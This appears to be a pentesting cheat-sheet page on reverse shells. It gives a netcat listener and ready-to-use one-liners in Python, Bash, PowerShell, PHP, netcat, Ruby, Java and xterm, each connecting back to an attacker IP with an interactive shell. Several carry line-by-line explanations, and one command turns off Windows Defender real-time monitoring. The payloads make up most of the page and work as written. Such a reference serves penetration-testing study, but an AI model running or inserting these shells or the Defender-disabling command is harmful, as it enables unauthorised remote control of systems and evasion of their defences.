---
title: Reverse Shells
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - web
  - pentesting
  - reverse-shells
---
# Reverse shells

??? abstract "Resources to generate reverse shells"
    - [https://www.revshells.com/](https://www.revshells.com/)
    - [Netcat for windows 32/64 bit](https://github.com/int0x33/nc.exe) 
    - [Pentesmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
    - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) 

??? abstract "All about shells"
    | **Shell Type**                       | **Description**                                                                                                                                                                                                                                   |
    | ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
    | [`Reverse shell`](reverse-shells.md) | Initiates a connection back to a "listener" on our attack box.                                                                                                                                                                                    |
    | [`Bind shell`](bind-shells.md)       | "Binds" to a specific port on the target host and waits for a connection from our attack box.                                                                                                                                                     |
    | [`Web shell`](web-shells.md)         | Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a `PHP` script to run a single command. |


Victim's machine Initiates a connection back to a "listener" on our attacking machine box. 

For this attack to work, first  we set the listener in the attacking machine using netcat.

```shell-session
nc -lnvp 1234
```

After that, on the victim's machine, you can launch the reverse shell connection. 

A Reverse Shell is handy when we want to get a quick, reliable connection to our compromised host. However, a Reverse Shell can be very fragile. Once the reverse shell command is stopped, or if we lose our connection for any reason, we would have to use the initial exploit to execute the reverse shell command again to regain our access.


## Reverse shell connections

### python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### bash

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

# rm /tmp/f;
# Removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files. The semi-colon (;) is used to execute the command sequentially.

# mkfifo /tmp/f;
# Makes a FIFO named pipe file at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (;) is used to execute the command sequentially.

# cat /tmp/f |
# Concatenates the FIFO named pipe file /tmp/f, the pipe (|) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (|).

# /bin/sh -i 2>&1 |
# Specifies the command language interpreter using the -i option to ensure the shell is interactive. 2>&1 ensures the standard error data stream (2) & standard output data stream (1) are redirected to the command following the pipe (|).

# nc $ip <port> >/tmp/f
# Uses Netcat to send a connection to our attack host $ip listening on port <port>. The output will be redirected (>) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed

```

### powershell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# same, but without assigning $client to the new object
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# powershell -nop -c 
# Executes powershell.exe with no profile (nop) and executes the command/script block (-c or -Command) contained in the quotes

# "$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,433);
# Sets/evaluates the variable $client equal to (=) the New-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses (10.10.14.158,443). The semi-colon (;) ensures the commands & code are executed sequentially.

# $stream = $client.GetStream();
# Sets/evaluates the variable $stream equal to (=) the $client variable and the .NET framework method called GetStream that facilitates network communications. 

# [byte[]]$bytes = 0..65535|%{0}; 
# Creates a byte type array ([]) called $bytes that returns 65,535 zeros as the values in the array. This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection.

# while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)

# Starts a while loop containing the $i variable set equal to (=) the .NET framework Stream.Read ($stream.Read) method. The parameters: buffer ($bytes), offset (0), and count ($bytes.Length) are defined inside the parentheses of the method.


# {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
# Sets/evaluates the variable $data equal to (=) an ASCII encoding .NET framework class that will be used in conjunction with the GetString method to encode the byte stream ($bytes) into ASCII. In short, what we type won't just be transmitted and received as empty bits but will be encoded as ASCII text. 

# $sendback = (iex $data 2>&1 | Out-String ); 
# Sets/evaluates the variable $sendback equal to (=) the Invoke-Expression (iex) cmdlet against the $data variable, then redirects the standard error (2>) & standard input (1) through a pipe (|) to the Out-String cmdlet which converts input objects into strings. Because Invoke-Expression is used, everything stored in $data will be run on the local computer. 

# $sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 
# Sets/evaluates the variable $sendback2 equal to (=) the $sendback variable plus (+) the string PS ('PS') plus + path to the working directory ((pwd).path) plus (+) the string '> '. This will result in the shell prompt being PS C:\workingdirectoryofmachine >. 

# $sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
# Sets/evaluates the variable $sendbyte equal to (=) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box.

```


```powershell-session
 Set-MpPreference -DisableRealtimeMonitoring $true
```
### php

```bash
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### netcat

```bash
nc -e /bin/sh 10.0.0.1 1234

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

### ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### java

```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
  

### xterm

```bash
xterm -display 10.0.0.1:1
```

